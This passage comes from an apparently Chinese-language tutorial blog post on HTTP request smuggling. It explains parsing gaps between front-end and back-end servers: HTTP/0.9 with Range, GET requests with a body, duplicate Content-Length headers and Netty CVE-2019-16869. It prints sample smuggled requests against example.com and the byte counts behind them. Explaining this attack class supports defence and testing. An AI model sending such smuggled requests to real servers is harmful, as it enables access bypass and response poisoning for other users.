src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130143300.png" alt=""></p><p>这张图的意思就是我们在 HTTP Smuggling 的时候使用 HTTP/0.9 进行 Smuggle ，这并不是 HTTP/0.9 标准的格式，但是由于一些中间件已经不支持直接解析 HTTP/0.9 的标准格式了，但是还可能存在解析这种指定 HTTP version 的情况。于是就可能存在以下这种情况：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130143557.png" alt=""></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130143626.png" alt=""></p><p>上面两个图展现了一个大致的攻击流程，chewy2.jpg 当中的 24-33664 字节有着一个完整的 HTTP 响应报文，当 Golang 在处理 HTTP/0.9 的时候，由于我们指定了<code>Range: bytes=24-33664</code>，就是我们可以指定获取响应报文的 24-33664 个字节，也就是获取了我们存放在图片当中的 HTTP 报文，然后返回给 Golang ，Golang 对于 HTTP/0.9 再进行标准化去头的处理，这样响应看起来就是一个新的响应了。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130153851.png" alt=""></p><p>当一个正常用户去请求的时候，如果 Apache 重新使用了 TCP/IP 链接，就会将我们构造在图片当中的 HTTP 报文当作响应包返回给用户。这也是一个很典型的 HTTP Response Splitting 的思路。具体可以看看视频演示 <a href="https://www.youtube.com/watch?v=lY_Mf2Fv7kI" target="_blank" rel="noopener">HTTP Smuggling Examples 2016</a></p><h3 id="Has-a-CL-in-GET"><a href="#Has-a-CL-in-GET" class="headerlink" title="Has a CL in GET"></a>Has a CL in GET</h3><p>这个场景其实就是在 GET 请求中使用了 body ，并以 Content-Length 指出了 body 的长度。</p><blockquote><p>​    其实在这里，影响到的并不仅仅是GET请求，所有不携带请求体的HTTP请求都有可能受此影响，只因为GET比较典型，我们把它作为一个例子。</p></blockquote><p>在 <a href="https://tools.ietf.org/html/rfc7230#section-3.3.2" target="_blank" rel="noopener">RFC7230 Content-Length</a> 部分提到：</p><blockquote><p>​    For example, a Content-Length header field is normally sent in a POST request even when the value is 0 (indicating an empty payload body).  A user agent SHOULD NOT send a Content-Length header field when the request message does not contain a payload body and the method semantics do not anticipate such a body.</p></blockquote><p>在最新的 <a href="https://tools.ietf.org/html/rfc7231#section-4.3.1" target="_blank" rel="noopener">RFC7231 4.3.1 GET</a> 中也仅仅提了一句：</p><blockquote><p>​    A payload within a GET request message has no defined semantics; sending a payload body on a GET request might cause some existing implementations to reject the request.</p></blockquote><p>对于类似拥有 body 字段并且以 Content-Length 指出其 body 长度的请求，RFC 并没有严格的说明 Server 应该如何去处理，所以大部分中间件对于拥有 body 的 GET 请求也是进行了宽松处理，但是也是部分情况，由于这些中间件没有一个严格的标准依据，所以也会产生解析差异导致 HTTP Smuggling 攻击。</p><p>这里我们举个简单且理想化的例子，Front 服务器对于 GET 请求允许携带 body ，而 Backend 服务器会忽略带 body 的 GET 请求。</p><p>当我们发送如下请求：</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 41\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /secret HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></tbody></table></figure><p></p><p>当 Front 服务器处理这个请求的时候，会把以上这个请求当作一个完整的请求转发给 Backend 服务器，而 Backend 服务求在处理这个服务器的时候，会把这个请求当作两个请求</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 41\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /secret HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></tbody></table></figure><p></p><p>这样我们就可以成功地进行了一次 HTTP Smuggling，从这个例子当中，我们也不难看出，如果有一个场景存在 HTTP Smuggling 漏洞，那么这个 Content-Length 数据就变得额外的重要，因为这影响到我们攻击是否成功，能否将我们的 HTTP 请求成功地“嵌入”在一个 HTTP 请求当中。</p><p>这里的计算方法与之前的类似，</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /secret HTTP/1.1\r\n--&gt;"GET /secret HTTP/1.1" 一共20个字符，加上CRLF一共22个字符</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n--&gt;"Host: example.com" 一共17个字符，加上CRLF一共19个字符</span><br></pre></td></tr></tbody></table></figure><p></p><p>22 + 19 = 41 个字节</p><h3 id="Two-Identical-Fields-CL"><a href="#Two-Identical-Fields-CL" class="headerlink" title="Two Identical Fields - CL"></a>Two Identical Fields - CL</h3><p>这里我们以 Content-Length 举例，在 <a href="https://tools.ietf.org/html/rfc7230#section-3.3.2" target="_blank" rel="noopener">RFC7230 section 3.3.2</a> 中，</p><blockquote><p>If a message is received that has multiple Content-Length header fields with field-values consisting of the same decimal value, or a single Content-Length header field with a field value containing a list of identical decimal values (e.g., “Content-Length: 42, 42”), indicating that duplicate Content-Length header fields have been generated or combined by an upstream message processor, then the recipient MUST either reject the message as invalid or replace the duplicated field-values with a single valid Content-Length field containing that decimal value prior to determining the message body length or forwarding the message.</p></blockquote><p>And <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3" target="_blank" rel="noopener">RFC 7230 section 3.3.3</a> 中也提到：</p><blockquote><p>If a message is received without Transfer-Encoding and with either multiple Content-Length header fields having differing field-values or a single Content-Length header field having an invalid value, then the message framing is invalid and the recipient MUST treat it as an unrecoverable error. If this is a request message, the server MUST respond with a 400 (Bad Request) status code and then close the connection.</p></blockquote><p>RFC 当中对于这中情况也有了比较明确的规范，但是我们这里假设举一个比较简单的例子，我们发送以下请求：</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /suzann.html HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 0\r\n</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 46\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /walter.html HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></tbody></table></figure><p></p><p>在这里，我们假设 Front 服务器以第二个 Content-Length 为解析标准，抛弃第一个 Content-Length 字段或者对第一个不做任何处理或者 anything else ，反正假设它只处理第二个 Content-Length 字段；我们在假设 Backend服务器以第一个 Content-Length 字段为解析标准，不理会第二个。</p><p>这样就相当于我们在 HTTP 请求中注入了另一个 HTTP 请求，如果整个场景像我们上述这样，就存在 HTTP Smuggling 攻击。</p><p>如过服务器以第一个 Content-Length 为解析标准，这样解析就会出现两个 HTTP 请求，如果以第二个作为解析标准，则会认为只有一个 HTTP 请求。</p><h3 id="Optional-WhiteSpace"><a href="#Optional-WhiteSpace" class="headerlink" title="Optional WhiteSpace"></a>Optional WhiteSpace</h3><p>RFC7320 中对于 header 字段有这样的描述：</p><blockquote><p>3.2.  Header Fields</p><p>   Each header field consists of a case-insensitive field name followed<br>   by a colon (“:”), optional leading whitespace, the field value, and<br>   optional trailing whitespace.</p><p>   header-field   = field-name “:” OWS field-value OWS</p><pre><code>field-name     = tokenfield-value    = *( field-content / obs-fold )field-content  = field-vchar [ 1*( SP / HTAB ) field-vchar ]field-vchar    = VCHAR / obs-textobs-fold       = CRLF 1*( SP / HTAB )               ; obsolete line folding               ; see Section 3.2.4</code></pre><p>   The field-name token labels the corresponding field-value as having<br>   the semantics defined by that header field.  For example, the Date<br>   header field is defined in Section 7.1.1.2 of [RFC7231] as containing<br>   the origination timestamp for the message in which it appears.</p></blockquote><p>尤其是开头的一句话表明，字段后面应该紧跟<code>:</code>冒号，然后是 OWS(Optional WhiteSpace) 可选的空格，然后再是字段值，最后是 OWS 可选空格。</p><p>这个会存在什么问题呢？很明显，如果有中间件对于这个的实现并没有严格遵循 RFC 标准的话，也会产生 HTTP Smuggling 攻击。</p><p>比较典型的例子就是 CVE-2019-16869 ，这枚 CVE 是 OPPO 子午互联网安全实验室发掘的，是关于 Netty 中间件存在 HTTP Smuggling 漏洞。</p><p>在 Netty 4.1.42.Final 版本之前对于 Header 头的处理是使用 <a href="https://github.com/netty/netty/blob/netty-4.1.41.Final/codec-http/src/main/java/io/netty/handler/codec/http/HttpObjectDecoder.java" target="_blank" rel="noopener">splitHeader</a> 方法，其中关键代码如下：</p><p></p><figure class="highlight java hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span> (nameEnd = nameStart; nameEnd &lt; length; nameEnd ++) {</span><br><span class="line">  <span class="hljs-keyword">char</span> ch = sb.charAt(nameEnd);</span><br><span class="line">  <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">':'</span> || Character.isWhitespace(ch)) {</span><br><span class="line">    <span class="hljs-keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>其他的代码我们并不需要过多了解，这里我们可以知道这里将空格与<code>:</code>冒号同样处理了，也就是如果存在空格会把<code>:</code>其之前的 field name 正常处理，并不会抛出错误或者进行其他操作。这样就与 RFC 标准的规范不一致了，于是就会产生解析差异。</p><p>@Bi3g0 构建了比较清晰的漏洞原理图：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I